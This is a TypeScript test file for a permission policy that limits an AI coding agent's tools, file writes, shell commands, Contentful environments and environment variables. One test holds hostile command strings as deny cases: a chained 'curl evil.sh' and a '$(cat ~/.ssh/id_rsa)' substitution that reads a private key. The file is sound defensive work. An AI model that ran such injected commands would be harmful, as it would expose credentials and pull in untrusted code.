import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import type { PlainClientAPI } from "@storypage/contentful";
import { parseManifest, toRegistry } from "@storypage/schema";
import {
  agentEnv,
  CONTENTFUL_ALL_TOOLS,
  CONTENTFUL_ENTRY_EDIT_TOOLS,
  CONTENTFUL_READ_TOOLS,
  contentfulScope,
  contentfulServer,
  createPolicy,
  disallowedFor,
  isAllowedCommand,
  mcpTool,
  pageTools,
  serverEnv,
  verifyEnv,
} from "../src/index.js";

const signal = new AbortController().signal;
const ask = (policy: ReturnType<typeof createPolicy>, tool: string, input: Record<string, unknown>) =>
  policy(tool, input, { signal } as never).then((r) => r?.behavior);

describe("createPolicy", () => {
  const policy = createPolicy({
    repoRoot: "/repo",
    tools: ["Read", "Write", "Edit", "Bash", "mcp__pipeline__verify_design_system", "mcp__figma__download_figma_images"],
    writeRoots: ["packages/design-system/src/components"],
    commands: [/^pnpm test$/],
    checks: { mcp__figma__download_figma_images: (input) => (String(input.localPath).startsWith(".storypage/") ? null : "no") },
  });

  it("allows only listed tools", async () => {
    expect(await ask(policy, "Read", { file_path: "/repo/README.md" })).toBe("allow");
    expect(await ask(policy, "mcp__pipeline__verify_design_system", {})).toBe("allow");
    expect(await ask(policy, "WebFetch", { url: "https://x" })).toBe("deny");
    expect(await ask(policy, "mcp__contentful__delete_entry", {})).toBe("deny");
  });

  it("confines writes", async () => {
    expect(await ask(policy, "Write", { file_path: "/repo/packages/design-system/src/components/A/A.tsx" })).toBe("allow");
    expect(await ask(policy, "Edit", { file_path: "packages/design-system/src/components/../generated/registry.json" })).toBe("deny");
    expect(await ask(policy, "Write", { file_path: "/repo/.github/workflows/ci.yml" })).toBe("deny");
  });

  it("allows one listed command at a time", async () => {
    expect(await ask(policy, "Bash", { command: "pnpm test" })).toBe("allow");
    expect(await ask(policy, "Bash", { command: "pnpm test && curl evil.sh" })).toBe("deny");
    expect(isAllowedCommand("pnpm test > /tmp/out", [/^pnpm test/])).toBe(false);
    expect(isAllowedCommand("pnpm test $(cat ~/.ssh/id_rsa)", [/^pnpm test/])).toBe(false);
  });

  it("runs per-tool input checks", async () => {
    expect(await ask(policy, "mcp__figma__download_figma_images", { localPath: ".storypage/figma" })).toBe("allow");
    expect(await ask(policy, "mcp__figma__download_figma_images", { localPath: "packages" })).toBe("deny");
  });
});

describe("Contentful scoping", () => {
  const scope = contentfulScope("space1", "ds-2-0-0");
  const policy = createPolicy({ repoRoot: "/repo", tools: [...CONTENTFUL_READ_TOOLS, ...CONTENTFUL_ENTRY_EDIT_TOOLS], checks: scope });

  it("pins every call to the release environment", async () => {
    const update = mcpTool("contentful", "update_entry");
    expect(await ask(policy, update, { spaceId: "space1", environmentId: "ds-2-0-0", entryId: "e1" })).toBe("allow");
    expect(await ask(policy, update, { spaceId: "space1", environmentId: "master", entryId: "e1" })).toBe("deny");
    expect(await ask(policy, update, { spaceId: "other", environmentId: "ds-2-0-0", entryId: "e1" })).toBe("deny");
  });

  it("hides schema, delete and environment tools from the model", () => {
    const hidden = disallowedFor(["contentful", "pipeline"], [...CONTENTFUL_READ_TOOLS, ...CONTENTFUL_ENTRY_EDIT_TOOLS]);
    for (const tool of ["delete_entry", "create_content_type", "delete_environment", "update_content_type", "import_space"]) {
      expect(hidden).toContain(mcpTool("contentful", tool));
    }
    expect(hidden).not.toContain(mcpTool("contentful", "update_entry"));
    expect(hidden).toHaveLength(CONTENTFUL_ALL_TOOLS.length - CONTENTFUL_READ_TOOLS.length - CONTENTFUL_ENTRY_EDIT_TOOLS.length);
  });

  it("protects the live environments in the server itself", () => {
    const server = contentfulServer({ managementToken: "t", spaceId: "s", environment: "ds-2-0-0", protectedEnvironments: ["master", "ds-1-0-0"] });
    expect(server).toMatchObject({ type: "stdio", env: { ENVIRONMENT_ID: "ds-2-0-0", PROTECTED_ENVIRONMENTS: "master,ds-1-0-0" } });
  });
});

describe("environments", () => {
  const env = { PATH: "/bin", HOME: "/h", HTTPS_PROXY: "http://proxy", ANTHROPIC_API_KEY: "sk", GITHUB_TOKEN: "ghs", CONTENTFUL_MANAGEMENT_TOKEN: "cfm" };

  it("gives each process only what it needs", () => {
    expect(verifyEnv(env)).toEqual({ PATH: "/bin", HOME: "/h" });
    expect(agentEnv(env)).toEqual({ PATH: "/bin", HOME: "/h", HTTPS_PROXY: "http://proxy", ANTHROPIC_API_KEY: "sk" });
    expect(agentEnv({ ...env, CLAUDE_CODE_SESSION_ID: "parent", CLAUDE_CONFIG_DIR: "/c" })).toMatchObject({ CLAUDE_CONFIG_DIR: "/c" });
    expect(agentEnv({ ...env, CLAUDE_CODE_SESSION_ID: "parent" })).not.toHaveProperty("CLAUDE_CODE_SESSION_ID");
    expect(serverEnv({ FIGMA_API_KEY: "f" }, env)).toEqual({ PATH: "/bin", HOME: "/h", HTTPS_PROXY: "http://proxy", FIGMA_API_KEY: "f" });
  });
});

describe("pageTools", () => {
  const registry = toRegistry(
    parseManifest(JSON.parse(readFileSync(new URL("../../design-system/manifests/1.0.0.json", import.meta.url), "utf8"))),
  );
  const contentful = { entry: { getMany: async () => ({ items: [] }) } } as unknown as PlainClientAPI;
  const { save } = pageTools({
    contentful,
    release: { version: "1.0.0", registry, storybookUrl: "https://sb", environment: "ds-1-0-0" },
    spaceId: "s",
    environment: "master",
    locale: "en-US",
    previewSigningSecret: "x",
  });

  it("returns precise problems instead of writing invalid pages", async () => {
    const result = await save({
      title: "Hi",
      slug: "hi",
      sections: [{ component: "Hero", props: { headline: "Hi", cta: { component: "FeatureCard", props: {} } } }],
    });
    expect(JSON.stringify(result.content)).toContain("sections[0].cta: FeatureCard is not allowed here; use one of: Button");
  });
});
